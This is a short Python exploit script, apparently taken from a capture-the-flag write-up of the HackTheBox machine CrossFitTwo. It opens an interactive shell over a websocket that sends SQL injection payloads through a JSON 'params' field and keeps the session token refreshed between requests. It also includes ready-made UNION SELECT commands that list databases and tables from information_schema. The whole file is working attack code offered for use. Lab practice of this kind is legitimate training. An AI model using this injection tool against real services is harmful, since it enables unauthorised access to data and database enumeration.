#!/usr/bin/env python3

######################
## https://0xdf.gitlab.io/2021/08/14/htb-crossfittwo.html
######################

import json
import websocket
from cmd import Cmd


class Term(Cmd):
    prompt = "injection> "

    def __init__(self):
        self.connect()
        super().__init__()

    def connect(self):
        self.ws = websocket.create_connection("ws://gym.crossfit.htb/ws/")
        data = json.loads(self.ws.recv())
        self.token = data["token"]

    def send_ws(self, params):
        self.ws.send(
            f'{{"message":"available","params":"{params}", "token": "{self.token}"}}'
        )
        data = json.loads(self.ws.recv())
        self.token = data["token"]
        return data["debug"]

    def send_connected(self, params):
        try:
            return self.send_ws(params)
        except websocket._exceptions.WebSocketConnectionClosedException:
            self.connect()
            return self.send_ws(params)

    def default(self, args):
        print(self.send_connected(args))

    def do_dbs(self, args):
        results = self.send_connected(
            "3 union select group_concat(schema_name),2 from information_schema.schemata"
        )
        print("\n".join(results.split(", ")[0].split()[1].split(",")))

    def do_tables(self, args):
        if len(args) == 0:
            print("[-] database name required. run dbs command to list databases.")
            return
        results = self.send_connected(
            f"3 union select group_concat(table_name), 2 from information_schema.tables where table_schema='{args}'"
        )
        print("\n".join(results.split(", ")[0].split()[1].split(",")))

    def do_exit(self, args):
        return True


term = Term()
term.cmdloop()
